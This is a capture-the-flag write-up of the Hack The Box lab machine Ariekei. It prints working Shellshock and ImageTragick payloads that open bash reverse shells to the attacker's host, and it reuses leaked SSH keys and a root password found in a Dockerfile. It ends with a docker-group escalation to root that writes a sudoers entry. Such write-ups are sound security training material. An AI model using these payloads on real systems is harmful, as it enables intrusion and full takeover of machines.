# Ariekei
#### 10.10.10.65
###### Dotaplayer365

**Nmap:**

```
nmap -A -T4 -sS -sV -v 10.10.10.65

Nmap scan report for 10.10.10.65
Host is up (0.12s latency).
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (EdDSA)
443/tcp  open  ssl/http nginx 1.10.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.10.2
|_http-title: Site Maintenance
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
| Issuer: stateOrProvinceName=Texas/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-09-24T01:37:05
| Not valid after:  2045-02-08T01:37:05
| MD5:   d73e ffe4 5f97 52ca 64dc 7770 abd0 2b7f
|_SHA-1: 1138 148e dfbd 6ad8 367b 08c8 1725 7408 eedb 4a7b
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
1022/tcp open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (EdDSA)

```

After checking the nmap results, we can see that there are 2 DNS names.

| IP                  | FQDN                        |
| -------------       |:-------------------------:  |
| 10.10.10.65:443     | calvin.ariekei.htb          |
| 10.10.10.65:443     | beehive.ariekei.htb         |


We can add both of them to our hosts file ofcourse

* **beehive.ariekei.htb**
    
    Maintainence!
    
    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Ariekei/Images/beehive.htb.PNG"></kbd>
    
    After dirbusting we instantly get a page like this! https://beehive.ariekei.htb/cgi-bin/stats/
    
    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Ariekei/Images/shellshock.website.PNG"></kbd>
    
    This screams shellshock!!
    
    Lets try it out
    
```

root@kali:~/hackthebox/Ariekei# curl -k -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id'  https://beehive.ariekei.htb/cgi-bin/stats/

<pre>
                          oooo$$$$$$$$$$$$oooo
                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$
   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$
oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$
"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$
  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$
   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$
    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o
   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o
   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o
  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$
  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""
 """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$
            "$$$o     """$$$$$$$$$$$$$$$$$$"$$"         $$$
              $$$o          "$$""$$$$$$""""           o$$$
               $$$$o                                o$$$"
                "$$$$o      o$$$$$$o"$$$$o        o$$$$
                  "$$$$$oo     ""$$$$o$$$$$o   o$$$$""
                     ""$$$$$oooo  "$$$o$$$$$$$$$"""
                        ""$$$$$$$oo $$$$$$$$$$
                                """"$$$$$$$$$$$
                                    $$$$$$$$$$$$
                                     $$$$$$$$$$"
                                      "$$$""""

</pre>
  ```
  
  GET REKT!
  
  Let the trolling begin.
  
  There is a WAF which is gonna troll us all the way, lets take a look at this later
  
  
  
  
  
* **calvin.ariekei.htb**

    Not Found?!

    <kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Ariekei/Images/calvin.htb.PNG"></kbd>
    
After doing some dirbusting we find a directory named ```/upload``` which has a very peculiar looking page
    
I tried to upload some normal jpg files with a simple php shell and some other tricks up my sleeve (which isnt too long )
    
The only thing left to try is [Image Tragic exploit](https://imagetragick.com/)
    
Lets create a mvg file with the contents:
    
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|/bin/bash -i >/dev/tcp/10.10.14.54/4444 0<&1 2>&1 &")'
pop graphic-context
```

Start a listner at 4444

Use browse and upload the image

And Voila!!

```
root@kali:~/hackthebox/Ariekei# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.10.65] 53582
[root@calvin app]# hostname
calvin.ariekei.htb
```

 We got root shell!?!?!

Its inside a docker :( feelsbadman

After doing some enum we find some juicy stuff inside the dir ```/common/.secrets```

It has 2 keys ```bastion_keu and bastion_key.pub```

Lets copy it to our machine

The pub tells us that its the login for root@ariekei ```ssh -v -i bastion_key root@ariekei.htb```

That didnt work, maybe its for the port 1022

```ssh -v -i bastion_key root@ariekei.htb -p1022```

Works!!!!

```
root@ezra:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ezra:~# hostname
ezra.ariekei.htb
```

Looks like we are inside a different host

```
root@ezra:/common/containers/blog-test# ls -l
total 24
-rw-r--r-- 1 root  999  144 Sep 23 18:43 Dockerfile
-rwxr--r-- 1 root  999   32 Sep 16 00:45 build.sh
drwxr-xr-x 2 root root 4096 Sep 26 18:24 cgi
drwxr-xr-x 7 root  999 4096 Sep 26 18:15 config
drwxr-xr-x 2 root root 4096 Dec 19 06:00 logs
-rwxrwx--x 1 root  999  386 Nov 13 14:36 start.sh
```

It seems to be the one with the cgi dir (Shellshock ahem ahem)

```
root@ezra:/common/containers/blog-test# cat Dockerfile 
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update 
RUN apt-get install python -y
RUN mkdir /common 
```

```
root@ezra:/common/containers/blog-test# cat start.sh 
docker run \
-v /dev/null:/root/.sh_history \
-v /dev/null:/root/.bash_history \
--restart on-failure:5 \
--net arieka-test-net --ip 172.24.0.2 \
-h beehive.ariekei.htb --name blog-test -dit \
-v /opt/docker:/common:ro \
-v $(pwd)/cgi:/usr/lib/cgi-bin:ro \
-v $(pwd)/config:/etc/apache2:ro \
-v $(pwd)/logs:/var/log/apache2 \
-v /home/spanishdancer:/home/spanishdancer:ro  web-template
```

We know that the internal ip for the cgi website is 172.24.0.2

Now we can try and run shellshock via the internal network and hope the WAF doesnt block us (We should check the WAF settings before we do it, but wth!)


```
root@ezra:/common/containers/blog-test# wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -i >/dev/tcp/10.10.14.54/4445 0<&1 2>&1" http://172.24.0.2/cgi-bin/stats
--2017-12-19 08:07:17--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response... 
```

```
root@kali:~/hackthebox/Ariekei# nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.10.65] 37862
www-data@beehive:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@beehive:/usr/lib/cgi-bin$ hostname
hostname
beehive.ariekei.htb
www-data@beehive:/usr/lib/cgi-bin$  
```

Shellz!

The docker file had a root password ```Ib3!kTEvYw6*P7s```

We can do su with that ofcourse



```
root@beehive:/home/spanishdancer# cat user.txt
cat user.txt
ff0bca827a5f660f6d35df7481e5f216
```

Its .ssh folder has some kewl infos

```
root@beehive:/home/spanishdancer/.ssh# ls -la
ls -la
total 20
drwx------ 2 1000 1000 4096 Sep 24 00:31 .
drwxr-xr-x 5 1000 1000 4096 Nov 13 14:19 ..
-rw-rw-r-- 1 1000 1000  407 Sep 24 00:31 authorized_keys
-rw------- 1 1000 1000 1766 Sep 24 00:31 id_rsa
-rw-r--r-- 1 1000 1000  407 Sep 24 00:31 id_rsa.pub
```

```
root@beehive:/home/spanishdancer/.ssh# cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----

root@beehive:/home/spanishdancer/.ssh# cat id_rsa.pub	
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC325QNrOHp+Ob93i/XR2XkXZ1k/ypSbKhdcKB2CQLNW1jXp+CKnb5wmin/hEJ8u3Crm5YsFjg/K/x6hBDa0TwpwQxIZ7y1JbWFXL3XRdvpi6YrIMdUwGs3lCAUwJhazVnOUAY92EnoLdQlbPgXT4gVxMfW37YDBC3Gg2YJRKUkrDaYsI9oxvGMU1vmigb/0Ck/+kG/n0yOa0NBb2orEwQYoqX1cW4PnuTmR7bD53PsWmNcYhLxSvd783tz9Q/Np7q9/ziPo2QCN1R0fY7UykmASA1hedfI6C2mUKaETN4vKnfVeppb5m7wXhkSlYULE5PcmXuGoYCD6WtwAzPiwb1r spanishdancer@ariekei.htb
```



Looks like a ssh key for the user spanishdancer

It would be better if we could ssh into the user instead of spawning shellz :D

Lets go Johnny!

<kbd><img src="https://media.giphy.com/media/REej9xTUwlmgM/giphy.gif"></kbd>

Step1:

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Ariekei/Images/Johnny1.PNG"></kbd>

Step 2:

<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Ariekei/Images/Johnny2.PNG"></kbd>

Le SSH Password

```
root@kali:~/hackthebox/Ariekei# ssh -i id_rsa spanishdancer@ariekei.htb
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
spanishdancer@ariekei:~$ hostname
ariekei.htb
```

We are now on ariekei.htb and not beehive or calvin Feelsgoodman

Time to break out of the docker

[Video](https://www.youtube.com/watch?v=AtO5TDJnieA&feature=youtu.be) Shows us how to break out of the docker to the host machine

```
spanishdancer@ariekei:~$ docker run --privileged --interactive --tty --volume /:/host bash
bash-4.4# echo "spanishdancer ALL=(ALL) NOPASSWD: ALL" > /host/etc/sudoers.d/foo
bash-4.4# exit
exit
spanishdancer@ariekei:~$ sudo -i
root@ariekei:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ariekei:~# cat root.txt
0385b6629b30f8a673f7bb279fb1570b
```
